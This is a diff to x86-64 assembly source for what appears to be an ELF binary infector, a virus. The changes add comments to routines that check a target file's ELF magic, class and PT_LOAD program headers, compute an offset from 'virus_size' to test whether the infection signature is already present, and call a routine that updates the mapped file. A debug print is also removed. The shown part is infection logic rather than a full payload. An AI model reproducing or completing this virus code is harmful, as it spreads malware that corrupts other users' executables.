@@ -76,7 +76,7 @@ _read_file_header_64:
 ;	cmp rax, 64  ; if their is less than 64 bytes readed, then the file is not a binary
 ;	jl _final_end
 ;; check magic number
-	mov rdi, [rsp + 24]
+	mov rdi, QWORD [rsp + 24]
 	cmp DWORD [rdi], 0x464c457f
 	jne _final_end
 ;; check class file (only 64 bits are treated)
@@ -86,49 +86,49 @@ _read_file_header_64:
 	cmp WORD [rdi + 16], 2
 	jne _final_end
 ;; check if our string is already in the file.
-	mov r10, QWORD [rsp + 24]
-	mov QWORD [rsp + 32], r10
-	add QWORD [rsp + 32], 32
-	mov r10, QWORD [rsp + 32]
-	mov r10, QWORD [r10]
-	mov QWORD [rsp + 32], r10
-	mov r10, QWORD [rsp + 24]
-	add QWORD [rsp + 32], r10
-	mov QWORD [rsp + 40], 0
-	mov r10, QWORD [rsp + 24]
-	mov QWORD [rsp + 48], r10
-	add QWORD [rsp + 48], 56
-	mov r11, QWORD [rsp + 48]
-	xor r10, r10
-	mov r10w, WORD [r11]
+	mov r10, QWORD [rsp + 24] ; r10 = mmaped addr
+	mov QWORD [rsp + 32], r10 ; phdr = r10
+	add QWORD [rsp + 32], 32 ; phdr += 32
+	mov r10, QWORD [rsp + 32] ; r10 = phdr
+	mov r10, QWORD [r10] ; r10 = *phdr
+	mov QWORD [rsp + 32], r10 ; phdr = r10
+	mov r10, QWORD [rsp + 24] ; r10 = mmap addr
+	add QWORD [rsp + 32], r10 ; phdr += r10
+	mov QWORD [rsp + 40], 0 ; phnum = 0
+	mov r10, QWORD [rsp + 24] ; r10 = mmap addr
+	mov QWORD [rsp + 48], r10 ; ehdr->e_phnum = r10
+	add QWORD [rsp + 48], 56 ; ehdr->e_phnum += 56
+	mov r11, QWORD [rsp + 48] ; r11 = ehdr->e_phnum
+	xor r10, r10 ; r10 = 0
+	mov r10w, WORD [r11] ; r10w = *ehdr->e_phnum
 ;	mov r10w, WORD [r11]
-	mov QWORD [rsp + 48], r10
+	mov QWORD [rsp + 48], r10 ; ehdr->e_phnum = r10
 
 _loop_verif:
-	mov r10, QWORD [rsp + 40]
-	cmp r10, QWORD [rsp + 48]
+	mov r10, QWORD [rsp + 40] ; r10 = phnum
+	cmp r10, QWORD [rsp + 48] ; if phnum >= ehdr->e_phnum
 	jge _final_end
-	mov r10, QWORD [rsp + 32]
-	cmp DWORD [r10], 1
+	mov r10, QWORD [rsp + 32] ; r10 = phdr
+	cmp DWORD [r10], 1 ; if *phdr != 1
 	jne _inc_before_reloop
-	add r10, 4
-	mov r10d, DWORD [r10]
-	and r10d, 1
-	cmp r10d, 1
+	add r10, 4 ; r10 += 4
+	mov r10d, DWORD [r10] ; r10 = *r10
+	and r10d, 1 ; r10 & 1
+	cmp r10d, 1 ; if r10 != 1
 	jne _inc_before_reloop
 ; we find pt_load
-	mov r10, QWORD [rsp + 32]
-	add r10, 8
-	mov r10, QWORD [r10]
-	mov QWORD [rsp + 56], r10
-	mov r10, QWORD [rsp + 32]
-	add r10, 32
-	mov r10, QWORD [r10]
-	add QWORD [rsp + 56], r10
-	mov r10, QWORD [rsp + 8]
-	sub QWORD [rsp + 56], r10
-	mov r10, QWORD [rsp + 24]
-	add QWORD [rsp + 56], r10
+	mov r10, QWORD [rsp + 32] ; r10 = phdr
+	add r10, 8 ; r10 += 8
+	mov r10, QWORD [r10] ; r10 = *r10
+	mov QWORD [rsp + 56], r10 ; str_offset = r10
+	mov r10, QWORD [rsp + 32] ; r10 = phdr
+	add r10, 32 ; r10 += 32
+	mov r10, QWORD [r10] ; r10 = *r10
+	add QWORD [rsp + 56], r10 ; str_offset += r10
+	mov r10, QWORD [rsp + 8] ; r10 = virus_size
+	sub QWORD [rsp + 56], r10 ; str_offset -= r10
+	mov r10, QWORD [rsp + 24] ; r10 = mmap
+	add QWORD [rsp + 56], r10 ; str_offset += r10
 	jmp _init_cmp_loop
 
 _inc_before_reloop:
@@ -159,15 +159,6 @@ _call_mmaped_update:
 	mov r10, QWORD [rsp]
 	call _update_mmaped_file
 
-;;;;;;;;;;;;;;;;;;;;;;;;
-;; just print string for debug, will not appear in final version
-;	push 0x000a6b6f
-;	mov rax, 1
-;	mov rdi, 1
-;	mov rsi, rsp
-;	mov rdx, 3
-;	syscall
-;	pop rdi
 ;;;;;;;;;;;;;;;;;;;;;;;;
 ; munmap
 _munmap:
